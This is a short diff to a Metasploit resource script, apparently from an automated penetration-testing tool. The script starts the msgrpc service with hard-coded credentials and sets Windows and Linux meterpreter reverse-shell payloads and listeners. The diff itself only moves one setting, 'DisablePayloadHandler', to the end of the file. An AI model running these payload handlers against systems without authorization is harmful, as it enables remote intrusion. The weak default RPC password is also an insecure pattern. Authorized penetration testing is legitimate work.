@@ -8,7 +8,6 @@ run_single("spool ~/.apt2/logs/"+time.strftime("%Y-%m-%d_%H-%M-%S")+"_msf_spool.
 load msgrpc User=msf Pass=msfpass
 
 # Set some GLOBAL values
-setg DisablePayloadHandler True
 setg PAYLOAD windows/meterpreter/reverse_https
 setg LHOST 0.0.0.0
 setg LPORT 4444
@@ -31,3 +30,5 @@ set ExitOnSession false
 set PAYLOAD payload/linux/x86/meterpreter/reverse_tcp
 set LPORT 4445
 exploit -j -z
+
+setg DisablePayloadHandler True
